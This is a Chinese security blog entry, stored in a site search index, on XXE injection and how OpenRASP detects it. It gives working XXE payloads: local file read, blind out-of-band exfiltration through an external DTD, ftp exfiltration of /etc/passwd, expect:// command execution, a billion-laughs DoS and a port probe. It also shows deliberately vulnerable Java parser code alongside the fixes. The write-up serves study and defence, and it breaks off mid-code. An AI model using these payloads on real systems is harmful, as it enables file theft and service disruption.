<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>OpenRASP-XXE漏洞</title>
      <link href="/2022/12/27/OpenRASP-XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/27/OpenRASP-XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-XXE漏洞"><a href="#OpenRASP-XXE漏洞" class="headerlink" title="OpenRASP-XXE漏洞"></a>OpenRASP-XXE漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​XXE，XML External Entity Injection（XML外部实体注入）。当开发人员配置其XML解析功能允许外部实体引用时，攻击者能通过该功能，实现任意文件读取、内网端口探测、命令执行、拒绝服务等方面的攻击。</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>​XML (Extensible Markup Language,可扩展标记语言），可以用来标记数据、定义数据类型，主要用来表达数据间的结构。XML文档结构包括XML声明、DTD文档类型定义、文档元素。</p><p>XML文档声明：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br></pre></td></tr></table></figure><p>元素、属性：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--img为元素，src为元素的属性，元素可包含文本、其他元素或者是空的。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>文档类型定义（DTD）：</p><p>​DTD是用来规范XML文档格式，既可以用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。既可以把这些规范放在源文件，也可以放在外面单独的文件。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">DTD内部声明：声明直接被包括在xml源文件中，通式为&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line"><span class="comment">在我看来，xml文件是规范区（DTD）和数据区总成的</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">DTD外部引用：声明直接被包括在xml源文件中，通式为&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span></span><br><span class="line"><span class="comment">外部引用，就是把上面&lt;!DOCTYPE &gt;放到外面单独的note.dtd文件中</span></span><br><span class="line"><span class="comment">*** 需要注意的是，外部dtd文件就不再需要&lt;!DOCTYPE note []&gt;，只需要&lt;?xml&gt;和&lt;!ENTITY&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实体：</p><p>​上面说到，DTD既提供了元素和结构上的规范，又用来定义实体，实体就是对普通文本或特殊字符的引用。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">内部实体，通式为&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;，在数据区通过“&amp;实体名;”引用</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">外部实体，通式为&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;，在数据区通过“&amp;实体名;”引用</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">外部参数实体，通式为&lt;!ENTITY % 实体名 &quot;实体内容”&gt;，只能在DTD中使用</span></span><br><span class="line"><span class="comment">*** 需要注意的是，%后面有空格</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">copyright</span> <span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">%copyright;</span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">***</span></span><br><span class="line"><span class="comment">注意参数实体只能在DTD中使用，这句话意味着下面这种，</span></span><br><span class="line"><span class="comment">直接在规范区中使用%p是错误的，需要放在外部dtd：https://blog.csdn.net/shawdow_bug/article/details/107690256</span></span><br><span class="line"><span class="comment">    &lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="comment">    &lt;!DOCTYPE note [</span></span><br><span class="line"><span class="comment">    &lt;!ENTITY % p &quot;text&quot;&gt;</span></span><br><span class="line"><span class="comment">    &lt;!ENTITY text &quot;this is a %p;&quot;&gt;         </span></span><br><span class="line"><span class="comment">    ]&gt;</span></span><br><span class="line"><span class="comment">    &lt;note&gt;&amp;text;&lt;/note&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><p>支持的协议：http、https、ftp、file、jar、netdoc、mailto和gopher。</p><h2 id="XXE不同种payload"><a href="#XXE不同种payload" class="headerlink" title="XXE不同种payload"></a>XXE不同种payload</h2><p>curl发送POST请求</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xml内容的双引号前要加\转义，否则后端调试时会发现所有双引号都会被删掉</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者-x <span class="string">&quot;http://127.0.0.1:8080&quot;</span>指定代理，通过burp修改xml内容，就不用加一堆\</span></span><br><span class="line"><span class="language-bash"><span class="comment"># 请求字段Content-Type:text/xml ，也是查找XXE漏洞的标志</span></span></span><br><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST HTTP://192.168.1.3:8083/document -d &quot;xml内容&quot;</span><br></pre></td></tr></table></figure><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/document -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt; &lt;!ENTITY xxe SYSTEM \&quot;file:///C:/Users/bmsk/Desktop/1.txt\&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">payload</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY&gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Users/bmsk/Desktop/1.txt&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Blind-XXE（无回显）"><a href="#Blind-XXE（无回显）" class="headerlink" title="Blind XXE（无回显）"></a>Blind XXE（无回显）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/XMLReader -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM \&quot;http://192.168.1.3:8084/attack.dtd\&quot;&gt; %remote;]&gt;&lt;attack&gt;&amp;send;&lt;/attack&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">payload</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个payload编写时要注意：先提一下，在我看来xml=规范区+数据区</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.%后面有空格；2.数据区必须引用&amp;send;，并不是写在DOCTYPE就能解析；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3.规范区必须引用%remote;，让send实体加载到规范区；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4.xml不能省去它的数据区&lt;attack&gt;，正如牛战士不能脱下他的面具；</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.1.3:8084/attack.dtd&quot;&gt; </span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">remote;]&gt;</span></span><br><span class="line">&lt;attack&gt;&amp;send;&lt;/attack&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://192.168.1.3:8084/attack.dtd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注意：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.这是外部实体dtd，不是xml规范区，不再需要写&lt;!DOCTYPE foo []&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.还是要使用必须先加载，故all%不可省略</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/bmsk/Desktop/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.1.3:8084/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">all;</span></span><br></pre></td></tr></table></figure><h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/XMLReader -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % remote SYSTEM \&quot;http://192.168.1.3:8084/attack.dtd\&quot;&gt; %remote;]&gt;&lt;attack&gt;&amp;send;&lt;/attack&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://192.168.1.3:8084/attack.dtd</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然也可直接传入，不需要dtd，加个马甲：&lt;!DOCTYPE lolz [ ]&gt;&lt;lolz&gt;&amp;send;&lt;/lolz&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回：[Fatal Error] :1:1: JAXP00010001: 解析器在此文档中遇到多个 <span class="string">&quot;64000&quot;</span> 实体扩展; 这是 JDK 施加的限制。</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY lol &quot;abc&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">&lt;!ENTITY send &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br></pre></td></tr></table></figure><p>​此外还能通过http协议实现内网端口探测，expect协议执行系统命令，ftp协议远程传输文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">探测mysql，开启返回HTTP request failed，不开启返回Connection refuse</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">既然服务端能发送http请求，这也是一种SSRF</span></span><br><span class="line">&lt;!ENTITY  bee SYSTEM &quot;http://192.168.3.25:3306&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行系统命令 好像需要是php</span></span><br><span class="line">&lt;!ENTITY  bee SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ftp协议远程传输文件</span></span><br><span class="line">&lt;!ENTITY %d SYSTEM “file:///etc/passwd”&gt;</span><br><span class="line">&lt;!ENTITY % c “&lt;!ENTITY rrr SYSTEM &#x27;ftp://xxxx:2121/%d;&#x27;&gt;”&gt;</span><br></pre></td></tr></table></figure><h3 id="字符问题？？？"><a href="#字符问题？？？" class="headerlink" title="字符问题？？？"></a>字符问题？？？</h3><p>​我的理解是，XML数据区包含&amp;、&lt;和&gt;等字符时，会和XML自身标签混淆，从而产生语法错误。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下面这种思路是，将解析的文件内容，放在&lt;![CDATA[...]]&gt;内部，CDATA不会按XML解析该文本。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最初我的复现失败了，感觉这种方式不适合Java，测试很多还是不大行......好像ftp、file等都会被文件内容限制</span></span><br><span class="line">curl -H &quot;Content-Type:text/xml&quot; -X POST http://192.168.1.3:8083/document -d &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % dtd SYSTEM \&quot;http://192.168.1.3:8084/attack.dtd\&quot;&gt;%dtd;%all;]&gt;&lt;SOAP-ENV:Envelope&gt;&lt;SOAP-ENV:Body&gt;&lt;getStatus&gt;&lt;id&gt;&amp;content;&lt;/id&gt;&lt;/getStatus&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://192.168.1.3:8084/attack.dtd</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/Users/bmsk/Desktop/1.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY content &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果环境是PHP，payload可以按上面，也有另一种方式：</span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY bee SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/robots.txt&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;reset&gt;&lt;login&gt;&amp;bee;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span></span><br></pre></td></tr></table></figure><h2 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h2><h3 id="DocumentBuilderFactory实现（有回显）"><a href="#DocumentBuilderFactory实现（有回显）" class="headerlink" title="DocumentBuilderFactory实现（有回显）"></a>DocumentBuilderFactory实现（有回显）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;document&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DocumentBuilder</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//获取请求体内容的标准代码，不在乎是啥格式</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="type">DocumentBuilder</span> <span class="variable">db</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">        <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> db.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line"></span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">RegistrationNo</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        tmp = RegistrationNo.item(<span class="number">0</span>).getFirstChild().getNodeValue();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XMLReader实现（无回显）"><a href="#XMLReader实现（无回显）" class="headerlink" title="XMLReader实现（无回显）"></a>XMLReader实现（无回显）</h3><p>​在实际环境中XML大多数时候并非是为了输出用，所以很多时候是不会有输出的，这样即使XML被解析了但是是无法直接读取文件的，所以我们需要外带数据，把数据发送出来读取。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//@RequestMapping(method = RequestMethod.POST)等价于@PostMapping</span></span><br><span class="line"><span class="meta">@PostMapping(value = &quot;XMLReader&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">xmlReader</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> IOException, SAXException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">XMLReader</span> <span class="variable">xmlReader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">        xmlReader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(body)));</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;xml parser fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;xml parser success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​修复XXE，可以直接禁用DTD，也可禁用外部实体和参数实体。如果不影响业务，考虑不解析XML。</p><h3 id="DocumentBuilderFactory实现"><a href="#DocumentBuilderFactory实现" class="headerlink" title="DocumentBuilderFactory实现"></a>DocumentBuilderFactory实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="XmlReader实现"><a href="#XmlReader实现" class="headerlink" title="XmlReader实现"></a>XmlReader实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这是优先选择. 如果不允许DTDs (doctypes) ,几乎可以阻止所有的XML实体攻击</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 如果不能完全禁用DTDs，最少采取以下措施，必须两项同时存在</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>); <span class="comment">// 防止外部实体POC</span></span><br><span class="line">xmlReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);  <span class="comment">// 防止参数实体POC</span></span><br></pre></td></tr></table></figure><h2 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h2><p>远程调试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:D:\javaProject\testRASP\target\rasp\rasp.jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9193 -jar rasp-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><h3 id="DisableDomXxeEntity和XXEHook"><a href="#DisableDomXxeEntity和XXEHook" class="headerlink" title="DisableDomXxeEntity和XXEHook"></a>DisableDomXxeEntity和XXEHook</h3><p>应用类：com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;parsers&#x2F;DOMParser、org&#x2F;apache&#x2F;xerces&#x2F;parsers&#x2F;DOMParser</p><p>hook类：DisableDomXxeEntity</p><p>应用类：com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xerces&#x2F;internal&#x2F;impl&#x2F;XMLEntityManager、org&#x2F;apache&#x2F;xerces&#x2F;impl&#x2F;XMLEntityManager、</p><p>org&#x2F;apache&#x2F;xerces&#x2F;util&#x2F;XMLEntityDescriptionImpl</p><p>hook类：XXEHook（XXE抽象类）</p><p>​这里测试用例是上面的“任意文件读取”payload，测试目标是DocumentBuilderFactory实现的XML解析，hook类DisableDomXxeEntity会拦截执行流。观察执行栈，可知在应用方法documentBuilder.parse内部会调用DOMParser.parse，检测代码setFeature就插入在DOMParser.parse执行前。检测代码setFeature，如果对XXE的action设置为block，就反射调用DOMParser.setFeature，直接设置XML解析器不允许DTD，是最严格的防御手段。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//位于DisableDomXxeEntity的hookMehtod方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(DisableDomXxeEntity.class, <span class="string">&quot;setFeature&quot;</span>, <span class="string">&quot;$0&quot;</span>, Object.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;parse&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//setFeature方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFeature</span><span class="params">(Object parser)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (HookHandler.isEnableCurrThreadHook()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> getAction();</span><br><span class="line">        <span class="keyword">if</span> (BLOCK_XXE_DISABLE_ENTITY.equals(action) &amp;&amp; getStatus(<span class="string">&quot;java_dom&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Reflection.invokeMethod(parser, <span class="string">&quot;setFeature&quot;</span>,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, <span class="type">boolean</span>.class&#125;, FEATURE, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                LogTool.traceHookWarn(<span class="string">&quot;Dom close xxe entity failed: &quot;</span> + t.getMessage(), t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​js对XXE的action设置一般为“ignore”，此时DOMParser.parse继续执行，当执行到XMLEntityManager.expandSystemId方法时，插桩在该位置的XXEHook.checkXXE方法，会获取每次解析的内容（SystemId）。checkXXE代码逻辑是，当缓存中还没有该SystemId时，就将其放入params，交给HookHandler.doCheck进入V8检测，js部分的“xxe_file”算法将检测出该payload用于文件读取。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//位于XXEHook的hookMethod方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(XXEHook.class, <span class="string">&quot;checkXXE&quot;</span>, <span class="string">&quot;$1&quot;</span>, String.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">src1</span> <span class="operator">=</span> 